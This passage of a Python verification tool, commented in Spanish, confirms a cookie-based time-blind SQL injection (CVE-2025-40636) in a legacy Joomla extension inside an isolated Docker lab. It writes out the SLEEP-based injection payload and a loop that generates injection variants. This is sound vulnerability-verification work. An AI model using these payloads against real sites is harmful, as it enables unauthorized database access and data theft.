        $res = @mysqli_query($this->conn, $this->sql);
        if ($res === false) {
            $this->lastErrNo = mysqli_errno($this->conn);
            $this->lastErrMsg = mysqli_error($this->conn);
        } else {
            $this->lastErrNo = 0; $this->lastErrMsg = '';
        }
        return $res;
    }

    public function loadRow() {
        $res = @mysqli_query($this->conn, $this->sql);
        if ($res === false) {
            $this->lastErrNo = mysqli_errno($this->conn);
            $this->lastErrMsg = mysqli_error($this->conn);
            return array();
        }
        $this->lastErrNo = 0; $this->lastErrMsg = '';
        $row = mysqli_fetch_row($res);
        return $row === null ? array() : $row;
    }

    public function loadResult() {
        $row = $this->loadRow();
        return isset($row[0]) ? $row[0] : null;
    }

    public function loadObject() {
        $res = @mysqli_query($this->conn, $this->sql);
        if ($res === false) {
            $this->lastErrNo = mysqli_errno($this->conn);
            $this->lastErrMsg = mysqli_error($this->conn);
            return null;
        }
        $this->lastErrNo = 0; $this->lastErrMsg = '';
        $obj = mysqli_fetch_object($res);
        return $obj === null ? null : $obj;
    }

    public function getErrorNum() { return $this->lastErrNo; }
    public function getErrorMsg() { return $this->lastErrMsg; }
    public function getAffectedRows() { return mysqli_affected_rows($this->conn); }
    public function Quote($text, $escape = true) {
        return "'" . ($escape ? mysqli_real_escape_string($this->conn, $text) : $text) . "'";
    }
}
"""

# Arnes que de verdad instancia la clase real de la extension (sin tocar su fichero) y mide
# cuanto tarda su constructor -- el oraculo por tiempo. MVC_COOKIE_VALUE ausente (no seteada) =
# sin cookie en absoluto (usado para la ejecucion semilla); presente = se manda esa cookie.
_LEGACY_HARNESS_PHP = r"""<?php
// PHP 8.1+ hace que mysqli lance excepcion por defecto; el driver legacy real que esta
// extension espera simplemente devuelve false y deja que quien llama compruebe
// getErrorNum() -- se iguala ese comportamiento para que una query NO relacionada con la que
// de verdad se esta probando (p.ej. el INSERT posterior, con una forma de ruptura distinta a
// la del SELECT objetivo) no aborte el script antes de poder leer la senal de tiempo.
mysqli_report(MYSQLI_REPORT_OFF);

require __DIR__ . '/stubs.php';

$moduleDir = '/module';
$entryFile = getenv('MVC_ENTRY_FILE');
$className = getenv('MVC_CLASS_NAME');
$cookieName = getenv('MVC_COOKIE_NAME');
$cookieVal = getenv('MVC_COOKIE_VALUE');

if ($cookieName !== false && $cookieVal !== false && $cookieVal !== '') {
    $_COOKIE[$cookieName] = $cookieVal;
}
$_SERVER['REMOTE_ADDR'] = '203.0.113.7';
$_SERVER['HTTP_USER_AGENT'] = 'binoracle-harness/1.0';

require $moduleDir . '/' . $entryFile;

$params = new JParamsStub();

$t0 = microtime(true);
$obj = new $className($params);
$elapsed = microtime(true) - $t0;

fwrite(STDOUT, "ELAPSED_SECONDS=" . $elapsed . "\n");
"""


class _LegacySqlHarnessLab:
    """Recursos Docker efimeros (red + MySQL + PHP-CLI) para verify_joomla_legacy_module_sqli_cookie.
    Deliberadamente SIN contenedor Joomla -- ver el docstring de esa funcion para el porque."""

    def __init__(self, tag: str):
        self.tag = tag
        self.net = f"binoracle-legacysqli-{tag}"
        self.mysql = f"binoracle-legacysqli-{tag}-db"
        self.php = f"binoracle-legacysqli-{tag}-php"
        self.db_pw = ""
        self._created: List[tuple] = []

    def sh(self, *args, timeout=60.0):
        return _run(["docker"] + list(args), timeout=timeout)

    def setup_network(self):
        self.sh("network", "create", self.net, timeout=30)
        self._created.append(("network", self.net))

    def start_mysql(self, db_pw: str):
        self.db_pw = db_pw
        self.sh("run", "-d", "--name", self.mysql, "--network", self.net, "--platform", "linux/amd64",
               "-e", f"MYSQL_ROOT_PASSWORD={db_pw}", "-e", "MYSQL_DATABASE=legacysqli",
               "-e", "MYSQL_USER=legacysqli", "-e", f"MYSQL_PASSWORD={db_pw}", _MYSQL_IMAGE,
               timeout=90)
        self._created.append(("container", self.mysql))

    def mysql_ready(self, tries: int = 100, delay: float = 3.0) -> bool:
        for _ in range(tries):
            r = self.sh("exec", self.mysql, "mysqladmin", "ping", "-ulegacysqli",
                       f"-p{self.db_pw}", "-h", "127.0.0.1", timeout=10)
            if r.returncode == 0:
                return True
            time.sleep(delay)
        return False

    def start_php(self):
        self.sh("run", "-d", "--name", self.php, "--network", self.net, "--platform", "linux/amd64",
               _PHP_CLI_IMAGE, "sleep", "infinity", timeout=90)
        self._created.append(("container", self.php))

    def php_mysqli_ready(self, timeout: float = 90.0) -> bool:
        r = self.sh("exec", self.php, "sh", "-c",
                   "docker-php-ext-install mysqli >/tmp/ext.log 2>&1; php -m | grep -qi mysqli && echo BINORACLE_OK",
                   timeout=timeout)
        return "BINORACLE_OK" in (r.stdout or "")

    def copy_in(self, host_path: str, container_path: str):
        self.sh("cp", host_path, f"{self.php}:{container_path}", timeout=60)

    def run_harness(self, entry_relpath: str, class_name: str, cookie_name: str,
                    cookie_value: Optional[str], timeout: float) -> Tuple[Optional[float], str]:
        """cookie_value=None -> sin cookie (ejecucion semilla); cualquier otro string (incluida
        la cadena vacia) -> se manda esa cookie."""
        env = ["-e", f"MVC_DB_HOST={self.mysql}", "-e", "MVC_DB_USER=legacysqli",
              "-e", f"MVC_DB_PASS={self.db_pw}", "-e", "MVC_DB_NAME=legacysqli",
              "-e", "MVC_DB_PREFIX=jos_", "-e", f"MVC_ENTRY_FILE={entry_relpath}",
              "-e", f"MVC_CLASS_NAME={class_name}", "-e", f"MVC_COOKIE_NAME={cookie_name}"]
        if cookie_value is not None:
            env += ["-e", f"MVC_COOKIE_VALUE={cookie_value}"]
        r = self.sh("exec", *env, self.php, "php", "/harness/run_harness.php", timeout=timeout)
        out = (r.stdout or "") + (r.stderr or "")
        m = re.search(r"ELAPSED_SECONDS=([0-9.]+)", out)
        return (float(m.group(1)) if m else None), out

    def teardown(self):
        for kind, name in reversed(self._created):
            try:
                if kind == "container":
                    self.sh("rm", "-f", name, timeout=30)
                elif kind == "network":
                    self.sh("network", "rm", name, timeout=15)
            except Exception:
                pass


def verify_joomla_legacy_module_sqli_cookie(
    ext_source_dir: str, slug: str, entry_relpath: str, class_name: str, cookie_name: str,
    cookie_encoding: str = "base64",
    on_step: Optional[Callable[[str], None]] = None, budget_s: float = 600.0,
) -> WpVerifyResult:
    """SQLi ciega por tiempo via COOKIE contra una extension Joomla LEGACY (pre-4.0) cuya logica
    vulnerable no se puede ni arrancar en el laboratorio Joomla+MySQL normal de este fichero.

    Nace de investigar CVE-2025-40636 de verdad (mod_vvisit_counter 2.0.4j3 / Vinaora Visitors
    Counter, INCIBE-2025-0540): el cookie `cip_vvisitcounter` se decodifica en base64 y se mete
    SIN escapar dentro de `WHERE ip=UNHEX(SHA1('$ip'))` (helper.php, metodo init(), confirmado
    leyendo el .zip real descargado desde un espejo de archive.org del sitio del propio autor
    -- la version de Joomla Extensions Directory/joomlacode.org ya no existe). Al intentar
    verificarlo en vivo contra el laboratorio Joomla 5 normal de este fichero,
    `extension:install` funciono de verdad (ver el cambio de docstring del modulo -- primera vez
    que se prueba en vivo contra una extension de terceros real), pero la extension misma NUNCA
    llega a ejecutar su SQL: su propio helper.php llama a `$db->query()`, `$db->Quote()`,
    `$db->getErrorNum()`, `$db->getErrorMsg()` -- el API legacy de JDatabaseDriver (Joomla
    <4.0) -- y el paquete `joomla/database` que usan TANTO Joomla 4 como Joomla 5 borro esos
    metodos (confirmado en vivo leyendo su propio DatabaseDriver.php: solo quedan
    `execute()`/`quote()`, en minuscula). Falla con "Call to undefined method" en la primera
    linea que toca la BD, antes de llegar siquiera al SQL inyectable. Y Joomla 3 (la version con
    la que esta extension SI es compatible) no tiene instalador desatendido por CLI en su imagen
    oficial (confirmado leyendo su entrypoint.sh: solo conecta la BD, nunca llama a ningun
    instalador) -- automatizarlo exigiria scriptear el wizard web multi-paso con estado de
    sesion, que no existe en este proyecto y es su propio esfuerzo, no uno que se vaya a forzar
    aqui sin probarlo.

    Por eso esta funcion NO levanta Joomla en absoluto. Levanta solo MySQL + un contenedor
    PHP-CLI con mysqli, les copia el codigo REAL SIN MODIFICAR de la extension (via `docker cp`,
    nunca extraido/reescrito), y ejecuta un arnes minimo (`_LEGACY_STUBS_PHP`) que SOLO repone
    los NOMBRES de metodo que Joomla 4/5 borraron -- cada uno o no hace nada (helpers de UI) o le
    pasa la query a mysqli sin escapar ni reescribir nada, exactamente lo que hacia el driver
    real de Joomla 3. El fichero de la extension (`entry_relpath`, p.ej. 'helper.php') se
    `require`a tal cual viene en el .zip, y se instancia `class_name` con un objeto $params de
    pega cuyo `get($k, $default)` siempre devuelve el default de PHP del propio codigo -- el
    equivalente a "modulo recien instalado, sin tocar su configuracion", que es precisamente
    como el aviso de INCIBE describe el alcance (reproducible en cualquier pagina donde el
    modulo se renderice, con su configuracion de fabrica).

    El oraculo es por TIEMPO (igual que verify_generic_sqli_blind en genericverify.py, mismo
    umbral: mediana de 2 controles + la mitad del SLEEP pedido, y solo verified=True si 2
    repeticiones INDEPENDIENTES del mismo payload superan el umbral) -- pero los contextos de
    ruptura (`_LEGACY_SQLI_CONTEXTS`) incluyen variantes con DOS y TRES parentesis de cierre que
    genericverify.py no trae, porque el SQL legacy de Joomla tipicamente envuelve el valor en
    funciones anidadas (`UNHEX(SHA1('$val'))`, confirmado en vivo contra este mismo CVE).

    Confirmado en vivo durante el desarrollo de esta funcion, contra el .zip real descargado
    (nunca contra produccion ni contra ningun sitio de terceros): la cookie
    `cip_vvisitcounter=base64("x')) OR SLEEP(N)-- -")` retraso la ejecucion ~N segundos de forma
    PROPORCIONAL (N=0 -> ruido; N=2 -> ~2.0s dos veces; N=5 -> ~5.0s dos veces) frente a una
    linea base de ~0.02s con una cookie benigna -- ver ROADMAP.md para el detalle completo y los
    numeros reales. Esa prueba exacta no esta congelada aqui como test (el .zip descargado no se
    commitea, por politica del proyecto); el test que acompana a esta funcion usa una extension
    SINTETICA que reproduce la misma forma (cookie base64 -> SQL legacy sin escapar).

    Limitaciones honestas (a diferencia de verify_joomla_account_takeover/deserialization, que
    corren contra un Joomla real completo):
      - Asume un constructor `__construct(&$params)` al estilo modulo/plugin Joomla clasico; si
        la extension real tiene otra forma (parametros distintos, logica repartida entre varias
        clases que no se instancian solo con `new $class_name($params)`), esta funcion no aplica.
      - No verifica el RENDER HTML de la pagina ni ninguna otra parte de la extension -- solo el
        canal de tiempo del efecto secundario en BD de instanciar la clase.
      - Solo MySQL (SLEEP()); no intenta dialectos de otros motores como si hace
        verify_generic_sqli_blind, porque el API legacy de JDatabaseDriver que motiva esta
        funcion es, en la practica, siempre MySQL/MySQLi en extensiones Joomla de esta era.
      - NO esta enganchada todavia al despacho automatico de investigate_cve en cve_agent.py
        (que solo conoce verify_joomla_account_takeover/verify_joomla_deserialization) -- se deja
        como seguimiento explicito en ROADMAP.md en vez de forzar esa integracion sin poder
        probarla con otro CVE real de esta misma forma.
    """
    step = on_step or (lambda _m: None)
    res = WpVerifyResult()
    t0 = time.time()

    if not _docker_daemon_ok():
        res.available = False
        res.detail = "sin daemon Docker alcanzable (o sin CLI de docker instalado)"
        res.limitations.append("verificacion dinamica NO intentada: revisa que Docker Desktop/"
                               "dockerd este arrancado")
        return res
    entry_abs = os.path.join(ext_source_dir, slug, entry_relpath)
    if not os.path.isfile(entry_abs):
        res.detail = f"no se encuentra {entry_relpath!r} dentro de {slug}/"
        res.limitations.append("entry_relpath debe ser la ruta (relativa al slug) del fichero "
                               "PHP que define la clase con la logica vulnerable")
        return res
    if not re.match(r"^[A-Za-z_][A-Za-z0-9_]*$", class_name):
        res.detail = f"class_name invalido: {class_name!r}"
        return res
    if not re.match(r"^[A-Za-z0-9_]+$", cookie_name):
        res.detail = f"cookie_name invalido: {cookie_name!r}"
        return res
    if cookie_encoding not in ("base64", "raw"):
        res.detail = f"cookie_encoding invalido: {cookie_encoding!r} (usa 'base64' o 'raw')"
        return res

    def encode_cookie(raw: str) -> str:
        return base64.b64encode(raw.encode()).decode() if cookie_encoding == "base64" else raw

    harness_dir = tempfile.mkdtemp(prefix="binoracle_legacysqli_")
    lab = None
    try:
        with open(os.path.join(harness_dir, "stubs.php"), "w") as f:
            f.write(_LEGACY_STUBS_PHP)
        with open(os.path.join(harness_dir, "run_harness.php"), "w") as f:
            f.write(_LEGACY_HARNESS_PHP)

        lab = _LegacySqlHarnessLab(_token())
        step("levantando laboratorio aislado (solo MySQL + PHP-CLI, SIN Joomla) para ejecutar "
             "el codigo real de la extension fuera del CMS...")
        lab.setup_network()
        lab.start_mysql(secrets.token_urlsafe(16))
        if not lab.mysql_ready():
            res.detail = "MySQL no respondio a tiempo"
            return res
        step("MySQL listo; arrancando PHP-CLI e instalando mysqli...")
        lab.start_php()
        if not lab.php_mysqli_ready():
            res.detail = "no se pudo instalar la extension mysqli en el contenedor PHP-CLI"
            return res
        lab.copy_in(harness_dir, "/harness")
        lab.copy_in(os.path.join(ext_source_dir, slug), "/module")

        res.evidence.update({"entry_file": entry_relpath, "class_name": class_name,
                             "cookie_name": cookie_name, "cookie_encoding": cookie_encoding})

        step("ejecucion semilla (sin cookie) -- deja una fila real en la BD para que el "
             "oraculo por tiempo tenga algo contra lo que evaluar el WHERE inyectado...")
        seed_elapsed, seed_out = lab.run_harness(entry_relpath, class_name, cookie_name,
                                                 cookie_value=None, timeout=30.0)
        if seed_elapsed is None:
            res.detail = ("la ejecucion semilla (sin cookie) no produjo una medida de tiempo -- "
                         "la extension no es compatible con este arnes (ver logs)")
            res.logs.append("salida semilla:\n" + seed_out[-2000:])
            res.limitations.append("este arnes solo repone los nombres de JFactory/"
                                   "JDatabaseDriver/JURI/JError/JLanguage*/JFile/JBrowser que "
                                   "el codigo de este CVE concreto necesito; otra extension "
                                   "puede necesitar API adicional que este arnes no cubre")
            return res
        step(f"ejecucion semilla OK ({seed_elapsed:.3f}s). Midiendo linea base con una cookie "
             f"benigna (2 peticiones independientes)...")

        benign = encode_cookie("1.2.3.4")
        base_times = []
        for _ in range(2):
            t, _o = lab.run_harness(entry_relpath, class_name, cookie_name, cookie_value=benign,
                                    timeout=30.0)
            if t is not None:
                base_times.append(t)
        if not base_times:
            res.detail = "las ejecuciones de control (cookie benigna) fallaron"
            return res
        base_times.sort()
        base_median = base_times[len(base_times) // 2]
        res.evidence["tiempo_base_mediana_s"] = round(base_median, 3)
        threshold = base_median + (_LEGACY_SQLI_SLEEP_SECONDS / 2)

        tried: List[dict] = []
        found = False
        for ctx in _LEGACY_SQLI_CONTEXTS:
            if found:
                break
            for cm in _LEGACY_SQLI_COMMENTS:
                if budget_s - (time.time() - t0) < 20:
                    res.limitations.append("presupuesto de tiempo agotado antes de agotar todas "
                                           "las combinaciones de contexto/comentario")
                    break
                raw_payload = f"x{ctx} OR SLEEP({_LEGACY_SQLI_SLEEP_SECONDS:.0f}){cm}"
                cookie_val = encode_cookie(raw_payload)
                step(f"probando cookie {cookie_name}={raw_payload!r} ({cookie_encoding}, "
                     f"time-based)...")
                timeout_s = _LEGACY_SQLI_SLEEP_SECONDS + 20
                t1, _o1 = lab.run_harness(entry_relpath, class_name, cookie_name, cookie_val,
                                          timeout_s)
                t2, _o2 = lab.run_harness(entry_relpath, class_name, cookie_name, cookie_val,
                                          timeout_s)
                entry = {"payload_crudo": raw_payload, "tiempo_1_s": round(t1, 3) if t1 else None,
                        "tiempo_2_s": round(t2, 3) if t2 else None}
                tried.append(entry)
                if t1 is not None and t2 is not None and t1 >= threshold and t2 >= threshold:
                    found = True
                    res.evidence["payload_ganador_crudo"] = raw_payload
                    res.evidence["cookie_ganadora"] = cookie_val
                    res.evidence["tiempo_1_ganador_s"] = round(t1, 3)
                    res.evidence["tiempo_2_ganador_s"] = round(t2, 3)
                    step(f"VERIFICADO: la cookie {cookie_name} con el valor crudo "
                         f"{raw_payload!r} retraso la ejecucion real del codigo sin modificar "
                         f"~{round((t1 + t2) / 2, 1)}s de forma CONSISTENTE en 2 repeticiones "
                         f"independientes (linea base {round(base_median, 2)}s) -- SQLi ciega "
                         f"por tiempo via cookie, no ruido.")
                    break

        res.evidence["intentos"] = tried
        shots: list = []
        if found:
            res.verified = True
            res.ok = True
            t1_w = res.evidence.get("tiempo_1_ganador_s", 0)
            t2_w = res.evidence.get("tiempo_2_ganador_s", 0)
            body = (f"cookie: {cookie_name}={res.evidence['payload_ganador_crudo']}\n"
                    f"linea_base: {round(base_median, 3)}s\n"
                    f"tiempo_1: {t1_w}s  tiempo_2: {t2_w}s\n"
                    f"threshold: {round(threshold, 3)}s")
            shots.append(_screenshot_response(
                f"php-cli://{slug}/{entry_relpath}", "PHP-CLI", 0, body,
                f"VERIFICADO — SQLi ciega por tiempo (cookie), payload={res.evidence['payload_ganador_crudo']!r}",
                lang="es"))
            res.detail = (f"SQLI CIEGA POR TIEMPO (via cookie) confirmada: la cookie "
                          f"{cookie_name} con valor crudo {res.evidence['payload_ganador_crudo']!r} "
                          f"retraso la ejecucion real del codigo fuente SIN MODIFICAR de forma "
                          f"consistente en 2 repeticiones independientes, por encima de la "
                          f"linea base + la mitad del retraso pedido")
        else:
            res.ok = True
            body = (f"linea_base: {round(base_median, 3)}s  threshold: {round(threshold, 3)}s\n"
                    f"intentos: {len(tried)}")
            shots.append(_screenshot_response(
                f"php-cli://{slug}/{entry_relpath}", "PHP-CLI", 0, body,
                "SQLi ciega cookie no confirmada — línea base y resultados", lang="es"))
            res.detail = (f"se probaron {len(tried)} combinaciones de contexto/comentario y "
                          f"ninguna retraso la ejecucion de forma consistente -- la SQLi ciega "
                          f"via cookie no se confirmo")
        res.evidence["screenshots"] = shots
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = f"timeout de infraestructura: {e}"
        return res
    except Exception as e:
        res.detail = f"error inesperado: {e}"
        return res
    finally:
        step("desmontando el laboratorio (contenedores/red/directorio temporal)...")
        if lab is not None:
            lab.teardown()
        shutil.rmtree(harness_dir, ignore_errors=True)
